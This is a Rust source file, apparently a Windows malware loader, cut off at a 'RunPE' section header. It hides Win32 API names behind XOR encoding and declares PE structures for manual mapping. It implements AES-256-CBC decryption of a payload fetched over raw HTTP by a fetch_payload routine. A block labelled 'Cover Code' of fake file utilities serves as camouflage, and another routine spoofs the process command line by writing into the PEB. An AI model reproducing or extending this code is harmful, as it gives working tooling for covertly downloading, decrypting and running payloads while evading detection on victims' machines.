#![allow(non_snake_case, non_camel_case_types)]

use std::env;
use std::fs::File;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpStream;

// ========== Win32 Constants ==========
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_READONLY: u32 = 0x02;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_NOACCESS: u32 = 0x01;
const SCN_MEM_EXECUTE: u32 = 0x20000000;
const SCN_MEM_READ: u32 = 0x40000000;
const SCN_MEM_WRITE: u32 = 0x80000000;
const DIR_IMPORT: usize = 1;
const DIR_EXCEPTION: usize = 3;
const DIR_BASERELOC: usize = 5;
const DIR_DELAY_IMPORT: usize = 13;
const ORDINAL_FLAG64: u64 = 0x8000000000000000;
const PE_SIGNATURE: u32 = 0x00004550;
const DUP_SAME_ACCESS: u32 = 0x02;
const INFINITE: u32 = 0xFFFFFFFF;
const CTX_FULL: u32 = 0x10000B;
const CTX_OFF_FLAGS: usize = 0x30;
const CTX_OFF_RIP: usize = 0xF8;
const CTX_SIZE: usize = 1232;

// ========== Win32 Types ==========
type HANDLE = *mut u8;
type HMODULE = *mut u8;
type FARPROC = *mut u8;

extern "system" {
    fn LoadLibraryA(name: *const u8) -> HMODULE;
    fn GetProcAddress(module: HMODULE, name: *const u8) -> FARPROC;
}

// ========== Function Pointer Types ==========
type FnVirtualAlloc = unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8;
type FnVirtualProtect = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
type FnSuspendThread = unsafe extern "system" fn(HANDLE) -> u32;
type FnResumeThread = unsafe extern "system" fn(HANDLE) -> u32;
type FnGetThreadContext = unsafe extern "system" fn(HANDLE, *mut u8) -> i32;
type FnSetThreadContext = unsafe extern "system" fn(HANDLE, *const u8) -> i32;
type FnGetCurrentThread = unsafe extern "system" fn() -> HANDLE;
type FnGetCurrentProcess = unsafe extern "system" fn() -> HANDLE;
type FnDuplicateHandle = unsafe extern "system" fn(HANDLE, HANDLE, HANDLE, *mut HANDLE, u32, i32, u32) -> i32;
type FnCreateThread = unsafe extern "system" fn(*mut u8, usize, *mut u8, *mut u8, u32, *mut u32) -> HANDLE;
type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, u32) -> u32;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
type FnSleepEx = unsafe extern "system" fn(u32, i32) -> u32;
type FnGetCommandLineW = unsafe extern "system" fn() -> *mut u16;
type FnGetCommandLineA = unsafe extern "system" fn() -> *mut u8;
type FnRtlAddFunctionTable = unsafe extern "system" fn(*mut u8, u32, u64) -> u8;

// ========== API Resolver ==========
struct WinApi {
    virtual_alloc: FnVirtualAlloc,
    virtual_protect: FnVirtualProtect,
    suspend_thread: FnSuspendThread,
    resume_thread: FnResumeThread,
    get_thread_context: FnGetThreadContext,
    set_thread_context: FnSetThreadContext,
    get_current_thread: FnGetCurrentThread,
    get_current_process: FnGetCurrentProcess,
    duplicate_handle: FnDuplicateHandle,
    create_thread: FnCreateThread,
    wait_for_single_object: FnWaitForSingleObject,
    close_handle: FnCloseHandle,
    sleep_ex: FnSleepEx,
    get_command_line_w: FnGetCommandLineW,
    get_command_line_a: FnGetCommandLineA,
    rtl_add_function_table: FnRtlAddFunctionTable,
}

#[inline(never)]
fn dk(s: &[u8]) -> Vec<u8> {
    let key = unsafe { std::ptr::read_volatile(&0x5Au8) };
    let mut out: Vec<u8> = s.iter().map(|&b| b ^ key).collect();
    out.push(0);
    out
}

fn resolve_apis() -> Option<WinApi> {
    unsafe {
        let k32_name = dk(&[0x31, 0x3f, 0x28, 0x34, 0x3f, 0x36, 0x69, 0x68, 0x74, 0x3e, 0x36, 0x36]);
        let k32 = LoadLibraryA(k32_name.as_ptr());
        if k32.is_null() { return None; }
        let ntdll_name = dk(&[0x34, 0x2e, 0x3e, 0x36, 0x36, 0x74, 0x3e, 0x36, 0x36]);
        let ntdll = LoadLibraryA(ntdll_name.as_ptr());
        if ntdll.is_null() { return None; }

        macro_rules! api {
            ($m:expr, $enc:expr) => {{
                let name = dk($enc);
                let p = GetProcAddress($m, name.as_ptr());
                if p.is_null() { return None; }
                std::mem::transmute(p)
            }};
        }

        Some(WinApi {
            virtual_alloc:          api!(k32, &[0x0c, 0x33, 0x28, 0x2e, 0x2f, 0x3b, 0x36, 0x1b, 0x36, 0x36, 0x35, 0x39]),
            virtual_protect:        api!(k32, &[0x0c, 0x33, 0x28, 0x2e, 0x2f, 0x3b, 0x36, 0x0a, 0x28, 0x35, 0x2e, 0x3f, 0x39, 0x2e]),
            suspend_thread:         api!(k32, &[0x09, 0x2f, 0x29, 0x2a, 0x3f, 0x34, 0x3e, 0x0e, 0x32, 0x28, 0x3f, 0x3b, 0x3e]),
            resume_thread:          api!(k32, &[0x08, 0x3f, 0x29, 0x2f, 0x37, 0x3f, 0x0e, 0x32, 0x28, 0x3f, 0x3b, 0x3e]),
            get_thread_context:     api!(k32, &[0x1d, 0x3f, 0x2e, 0x0e, 0x32, 0x28, 0x3f, 0x3b, 0x3e, 0x19, 0x35, 0x34, 0x2e, 0x3f, 0x22, 0x2e]),
            set_thread_context:     api!(k32, &[0x09, 0x3f, 0x2e, 0x0e, 0x32, 0x28, 0x3f, 0x3b, 0x3e, 0x19, 0x35, 0x34, 0x2e, 0x3f, 0x22, 0x2e]),
            get_current_thread:     api!(k32, &[0x1d, 0x3f, 0x2e, 0x19, 0x2f, 0x28, 0x28, 0x3f, 0x34, 0x2e, 0x0e, 0x32, 0x28, 0x3f, 0x3b, 0x3e]),
            get_current_process:    api!(k32, &[0x1d, 0x3f, 0x2e, 0x19, 0x2f, 0x28, 0x28, 0x3f, 0x34, 0x2e, 0x0a, 0x28, 0x35, 0x39, 0x3f, 0x29, 0x29]),
            duplicate_handle:       api!(k32, &[0x1e, 0x2f, 0x2a, 0x36, 0x33, 0x39, 0x3b, 0x2e, 0x3f, 0x12, 0x3b, 0x34, 0x3e, 0x36, 0x3f]),
            create_thread:          api!(k32, &[0x19, 0x28, 0x3f, 0x3b, 0x2e, 0x3f, 0x0e, 0x32, 0x28, 0x3f, 0x3b, 0x3e]),
            wait_for_single_object: api!(k32, &[0x0d, 0x3b, 0x33, 0x2e, 0x1c, 0x35, 0x28, 0x09, 0x33, 0x34, 0x3d, 0x36, 0x3f, 0x15, 0x38, 0x30, 0x3f, 0x39, 0x2e]),
            close_handle:           api!(k32, &[0x19, 0x36, 0x35, 0x29, 0x3f, 0x12, 0x3b, 0x34, 0x3e, 0x36, 0x3f]),
            sleep_ex:               api!(k32, &[0x09, 0x36, 0x3f, 0x3f, 0x2a, 0x1f, 0x22]),
            get_command_line_w:     api!(k32, &[0x1d, 0x3f, 0x2e, 0x19, 0x35, 0x37, 0x37, 0x3b, 0x34, 0x3e, 0x16, 0x33, 0x34, 0x3f, 0x0d]),
            get_command_line_a:     api!(k32, &[0x1d, 0x3f, 0x2e, 0x19, 0x35, 0x37, 0x37, 0x3b, 0x34, 0x3e, 0x16, 0x33, 0x34, 0x3f, 0x1b]),
            rtl_add_function_table: api!(ntdll, &[0x08, 0x2e, 0x36, 0x1b, 0x3e, 0x3e, 0x1c, 0x2f, 0x34, 0x39, 0x2e, 0x33, 0x35, 0x34, 0x0e, 0x3b, 0x38, 0x36, 0x3f]),
        })
    }
}

// ========== PE Structures ==========
#[repr(C)]
struct DosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct FileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct DataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct OptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_os_version: u16,
    minor_os_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [DataDirectory; 16],
}

#[repr(C)]
struct NtHeaders64 {
    signature: u32,
    file_header: FileHeader,
    optional_header: OptionalHeader64,
}

#[repr(C)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C)]
struct BaseRelocation {
    virtual_address: u32,
    size_of_block: u32,
}

#[repr(C)]
struct ImportDescriptor {
    original_first_thunk: u32,
    time_date_stamp: u32,
    forwarder_chain: u32,
    name: u32,
    first_thunk: u32,
}

#[repr(C)]
struct DelayImportDescriptor {
    attributes: u32,
    dll_name_rva: u32,
    module_handle_rva: u32,
    import_address_table_rva: u32,
    import_name_table_rva: u32,
    bound_import_address_table_rva: u32,
    unload_import_address_table_rva: u32,
    time_date_stamp: u32,
}

#[repr(C)]
struct RuntimeFunction {
    begin_address: u32,
    end_address: u32,
    unwind_info_address: u32,
}

// ========== SHA-256 ==========
const SHA256_K: [u32; 64] = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

fn sha256(data: &[u8]) -> [u8; 32] {
    let mut h: [u32; 8] = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
    ];
    let bit_len = (data.len() as u64) * 8;
    let mut padded = data.to_vec();
    padded.push(0x80);
    while (padded.len() % 64) != 56 { padded.push(0); }
    padded.extend_from_slice(&bit_len.to_be_bytes());
    for chunk in padded.chunks(64) {
        let mut w = [0u32; 64];
        for i in 0..16 { w[i] = u32::from_be_bytes([chunk[i*4], chunk[i*4+1], chunk[i*4+2], chunk[i*4+3]]); }
        for i in 16..64 {
            let s0 = w[i-15].rotate_right(7) ^ w[i-15].rotate_right(18) ^ (w[i-15] >> 3);
            let s1 = w[i-2].rotate_right(17) ^ w[i-2].rotate_right(19) ^ (w[i-2] >> 10);
            w[i] = w[i-16].wrapping_add(s0).wrapping_add(w[i-7]).wrapping_add(s1);
        }
        let (mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh) = (h[0],h[1],h[2],h[3],h[4],h[5],h[6],h[7]);
        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ ((!e) & g);
            let t1 = hh.wrapping_add(s1).wrapping_add(ch).wrapping_add(SHA256_K[i]).wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let t2 = s0.wrapping_add(maj);
            hh = g; g = f; f = e; e = d.wrapping_add(t1); d = c; c = b; b = a; a = t1.wrapping_add(t2);
        }
        h[0] = h[0].wrapping_add(a); h[1] = h[1].wrapping_add(b);
        h[2] = h[2].wrapping_add(c); h[3] = h[3].wrapping_add(d);
        h[4] = h[4].wrapping_add(e); h[5] = h[5].wrapping_add(f);
        h[6] = h[6].wrapping_add(g); h[7] = h[7].wrapping_add(hh);
    }
    let mut out = [0u8; 32];
    for i in 0..8 { out[i*4..i*4+4].copy_from_slice(&h[i].to_be_bytes()); }
    out
}

// ========== AES-256-CBC ==========
static SBOX: [u8; 256] = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
];

static INV_SBOX: [u8; 256] = [
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
];

static RCON: [u8; 10] = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

fn gf_mul(mut a: u8, mut b: u8) -> u8 {
    let mut p: u8 = 0;
    for _ in 0..8 {
        if (b & 1) != 0 { p ^= a; }
        let hi = (a & 0x80) != 0;
        a <<= 1;
        if hi { a ^= 0x1b; }
        b >>= 1;
    }
    p
}

fn aes256_key_expansion(key: &[u8; 32]) -> [[u8; 16]; 15] {
    let mut rk = [[0u8; 16]; 15];
    rk[0].copy_from_slice(&key[..16]);
    rk[1].copy_from_slice(&key[16..]);
    let nk = 8;
    let mut w = [0u32; 60];
    for i in 0..nk { w[i] = u32::from_be_bytes([key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]]); }
    for i in nk..60 {
        let mut temp = w[i - 1];
        if i % nk == 0 {
            temp = temp.rotate_left(8);
            let b = temp.to_be_bytes();
            temp = u32::from_be_bytes([SBOX[b[0] as usize], SBOX[b[1] as usize], SBOX[b[2] as usize], SBOX[b[3] as usize]]);
            temp ^= (RCON[i / nk - 1] as u32) << 24;
        } else if i % nk == 4 {
            let b = temp.to_be_bytes();
            temp = u32::from_be_bytes([SBOX[b[0] as usize], SBOX[b[1] as usize], SBOX[b[2] as usize], SBOX[b[3] as usize]]);
        }
        w[i] = w[i - nk] ^ temp;
    }
    for r in 0..15 { for j in 0..4 { let bytes = w[r * 4 + j].to_be_bytes(); rk[r][j*4..j*4+4].copy_from_slice(&bytes); } }
    rk
}

fn aes256_decrypt_block(block: &[u8; 16], rk: &[[u8; 16]; 15]) -> [u8; 16] {
    let mut state = [0u8; 16];
    for i in 0..16 { state[i] = block[i] ^ rk[14][i]; }
    for round in (1..14).rev() {
        let tmp = state;
        state[0] = tmp[0]; state[1] = tmp[13]; state[2] = tmp[10]; state[3] = tmp[7];
        state[4] = tmp[4]; state[5] = tmp[1]; state[6] = tmp[14]; state[7] = tmp[11];
        state[8] = tmp[8]; state[9] = tmp[5]; state[10] = tmp[2]; state[11] = tmp[15];
        state[12] = tmp[12]; state[13] = tmp[9]; state[14] = tmp[6]; state[15] = tmp[3];
        for i in 0..16 { state[i] = INV_SBOX[state[i] as usize]; }
        for i in 0..16 { state[i] ^= rk[round][i]; }
        let mut tmp2 = [0u8; 16];
        for col in 0..4 {
            let s0 = state[col * 4]; let s1 = state[col * 4 + 1]; let s2 = state[col * 4 + 2]; let s3 = state[col * 4 + 3];
            tmp2[col*4]     = gf_mul(0x0e, s0) ^ gf_mul(0x0b, s1) ^ gf_mul(0x0d, s2) ^ gf_mul(0x09, s3);
            tmp2[col*4 + 1] = gf_mul(0x09, s0) ^ gf_mul(0x0e, s1) ^ gf_mul(0x0b, s2) ^ gf_mul(0x0d, s3);
            tmp2[col*4 + 2] = gf_mul(0x0d, s0) ^ gf_mul(0x09, s1) ^ gf_mul(0x0e, s2) ^ gf_mul(0x0b, s3);
            tmp2[col*4 + 3] = gf_mul(0x0b, s0) ^ gf_mul(0x0d, s1) ^ gf_mul(0x09, s2) ^ gf_mul(0x0e, s3);
        }
        state = tmp2;
    }
    let tmp = state;
    state[0] = tmp[0]; state[1] = tmp[13]; state[2] = tmp[10]; state[3] = tmp[7];
    state[4] = tmp[4]; state[5] = tmp[1]; state[6] = tmp[14]; state[7] = tmp[11];
    state[8] = tmp[8]; state[9] = tmp[5]; state[10] = tmp[2]; state[11] = tmp[15];
    state[12] = tmp[12]; state[13] = tmp[9]; state[14] = tmp[6]; state[15] = tmp[3];
    for i in 0..16 { state[i] = INV_SBOX[state[i] as usize]; }
    for i in 0..16 { state[i] ^= rk[0][i]; }
    state
}

fn decrypt_aes_cbc(data: &[u8], passphrase: &str) -> Result<Vec<u8>, String> {
    if data.len() <= 16 || (data.len() - 16) % 16 != 0 { return Err("invalid data length".into()); }
    let iv = &data[..16];
    let ciphertext = &data[16..];
    let key = sha256(passphrase.as_bytes());
    let rk = aes256_key_expansion(&key);
    let mut plaintext = Vec::with_capacity(ciphertext.len());
    let mut prev_block = [0u8; 16];
    prev_block.copy_from_slice(iv);
    for chunk in ciphertext.chunks(16) {
        let mut block = [0u8; 16];
        block.copy_from_slice(chunk);
        let decrypted = aes256_decrypt_block(&block, &rk);
        let mut out = [0u8; 16];
        for i in 0..16 { out[i] = decrypted[i] ^ prev_block[i]; }
        plaintext.extend_from_slice(&out);
        prev_block = block;
    }
    if let Some(&pad) = plaintext.last() {
        let pad = pad as usize;
        if pad >= 1 && pad <= 16 && plaintext.len() >= pad {
            if plaintext[plaintext.len()-pad..].iter().all(|&b| b as usize == pad) {
                plaintext.truncate(plaintext.len() - pad);
            }
        }
    }
    Ok(plaintext)
}

// ========== Cover Code ==========
fn run_wc(path: &str) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("wc: {}: {}", path, e); return 1; } };
    let (mut lines, mut words, mut bytes) = (0u64, 0u64, 0u64);
    for line in BufReader::new(f).lines().flatten() {
        lines += 1; bytes += line.len() as u64 + 1; words += line.split_whitespace().count() as u64;
    }
    println!("{:>7} {:>7} {:>7} {}", lines, words, bytes, path);
    0
}

fn run_head(path: &str, count: usize) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("head: {}: {}", path, e); return 1; } };
    for (i, line) in BufReader::new(f).lines().enumerate().take(count) {
        if let Ok(l) = line { println!("{:>4} | {}", i + 1, l); }
    }
    0
}

fn run_tail(path: &str, count: usize) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("tail: {}: {}", path, e); return 1; } };
    let all: Vec<String> = BufReader::new(f).lines().flatten().collect();
    let start = all.len().saturating_sub(count);
    for (i, line) in all[start..].iter().enumerate() { println!("{:>4} | {}", start + i + 1, line); }
    0
}

fn run_hexdump(path: &str) -> i32 {
    let mut f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("hexdump: {}: {}", path, e); return 1; } };
    let mut buf = [0u8; 16]; let mut offset = 0usize;
    loop {
        let n = match f.read(&mut buf) { Ok(0) => break, Ok(n) => n, Err(_) => break };
        print!("{:08X}  ", offset);
        for i in 0..16 { if i < n { print!("{:02X} ", buf[i]); } else { print!("   "); } if i == 7 { print!(" "); } }
        print!(" |");
        for b in &buf[..n] { print!("{}", if *b >= 0x20 && *b <= 0x7E { *b as char } else { '.' }); }
        println!("|");
        offset += n;
        if offset >= 4096 { println!("... (truncated)"); break; }
    }
    0
}

fn run_crc32(path: &str) -> i32 {
    let mut f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("crc32: {}: {}", path, e); return 1; } };
    let mut crc: u32 = 0xFFFFFFFF; let mut buf = [0u8; 8192];
    loop {
        let n = match f.read(&mut buf) { Ok(0) => break, Ok(n) => n, Err(_) => break };
        for &b in &buf[..n] { crc ^= b as u32; for _ in 0..8 { crc = (crc >> 1) ^ (0xEDB88320 & (0u32.wrapping_sub(crc & 1))); } }
    }
    println!("{:08X}  {}", crc ^ 0xFFFFFFFF, path);
    0
}

fn run_entropy(path: &str) -> i32 {
    let mut f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("entropy: {}: {}", path, e); return 1; } };
    let mut freq = [0u64; 256]; let mut total = 0u64; let mut buf = [0u8; 8192];
    loop {
        let n = match f.read(&mut buf) { Ok(0) => break, Ok(n) => n, Err(_) => break };
        for &b in &buf[..n] { freq[b as usize] += 1; total += 1; }
    }
    if total == 0 { println!("0.0000 bits/byte  {}", path); return 0; }
    let mut entropy = 0.0f64;
    for &count in &freq { if count == 0 { continue; } let p = count as f64 / total as f64; entropy -= p * p.log2(); }
    println!("{:.4} bits/byte  {}", entropy, path);
    0
}

fn run_sort(path: &str) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("sort: {}: {}", path, e); return 1; } };
    let mut lines: Vec<String> = BufReader::new(f).lines().flatten().collect();
    lines.sort();
    for l in &lines { println!("{}", l); }
    0
}

fn run_uniq(path: &str) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("uniq: {}: {}", path, e); return 1; } };
    let mut prev = String::new(); let mut count = 0u64;
    for line in BufReader::new(f).lines().flatten() {
        if line == prev { count += 1; } else { if count > 0 { println!("{:>6} {}", count, prev); } prev = line; count = 1; }
    }
    if count > 0 { println!("{:>6} {}", count, prev); }
    0
}

fn run_grep(pattern: &str, path: &str) -> i32 {
    let f = match File::open(path) { Ok(f) => f, Err(e) => { eprintln!("grep: {}: {}", path, e); return 1; } };
    let mut matches = 0;
    for (i, line) in BufReader::new(f).lines().enumerate() {
        if let Ok(l) = line { if l.contains(pattern) { println!("{:>4}: {}", i + 1, l); matches += 1; } }
    }
    if matches == 0 { println!("(no matches)"); }
    0
}

fn run_compare(p1: &str, p2: &str) -> i32 {
    let mut f1 = match File::open(p1) { Ok(f) => f, Err(e) => { eprintln!("compare: {}: {}", p1, e); return 1; } };
    let mut f2 = match File::open(p2) { Ok(f) => f, Err(e) => { eprintln!("compare: {}: {}", p2, e); return 1; } };
    let mut b1 = Vec::new(); let mut b2 = Vec::new();
    let _ = f1.read_to_end(&mut b1); let _ = f2.read_to_end(&mut b2);
    let max_len = b1.len().max(b2.len()); let mut diffs = 0;
    for i in 0..max_len {
        let c1 = b1.get(i).copied().unwrap_or(0); let c2 = b2.get(i).copied().unwrap_or(0);
        if c1 != c2 { if diffs < 20 { println!("  offset 0x{:08X}: 0x{:02X} vs 0x{:02X}", i, c1, c2); } diffs += 1; }
    }
    if diffs == 0 { println!("Files are identical ({} bytes)", b1.len()); } else { println!("{} byte differences across {} bytes", diffs, max_len); }
    0
}

fn run_filesize(path: &str) -> i32 {
    match std::fs::metadata(path) {
        Ok(m) => { let sz = m.len();
            if sz < 1024 { println!("{} bytes  {}", sz, path); }
            else if sz < 1048576 { println!("{:.1} KB  {}", sz as f64 / 1024.0, path); }
            else { println!("{:.2} MB  {}", sz as f64 / 1048576.0, path); }
            0
        }
        Err(e) => { eprintln!("size: {}: {}", path, e); 1 }
    }
}

// ========== Network ==========
fn fetch_payload(host: &str, port: u16, path: &str) -> Result<Vec<u8>, String> {
    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect(&addr).map_err(|e| format!("connect: {}", e))?;
    let req = format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", path, host);
    stream.write_all(req.as_bytes()).map_err(|e| format!("send: {}", e))?;
    let mut resp = Vec::new();
    stream.read_to_end(&mut resp).map_err(|e| format!("recv: {}", e))?;
    let body_start = resp.windows(4).position(|w| w == b"\r\n\r\n").ok_or("no HTTP body")?;
    Ok(resp[body_start + 4..].to_vec())
}

// ========== Command Line Spoofing ==========
unsafe fn spoof_command_line(apis: &WinApi, args: Option<&str>) {
    let full_cmd = match args {
        Some(a) if !a.is_empty() => format!("program.exe {}\0", a),
        _ => "program.exe\0".to_string(),
    };
    let new_len = full_cmd.len() - 1;

    let cached_w = (apis.get_command_line_w)();
    if !cached_w.is_null() {
        for (i, &b) in full_cmd.as_bytes()[..new_len].iter().enumerate() {
            *cached_w.add(i) = b as u16;
        }
        *cached_w.add(new_len) = 0;
    }

    let cached_a = (apis.get_command_line_a)();
    if !cached_a.is_null() {
        std::ptr::copy_nonoverlapping(full_cmd.as_ptr(), cached_a, new_len);
        *cached_a.add(new_len) = 0;
    }

    let teb: usize;
    std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
    let peb = *((teb + 0x60) as *const usize);
    let process_params = *((peb + 0x20) as *const usize);
    *((process_params + 0x70) as *mut u16) = (new_len * 2) as u16;

    println!("[*] CommandLine spoofed -> \"{}\"", &full_cmd[..new_len]);
}

// ========== RunPE ==========
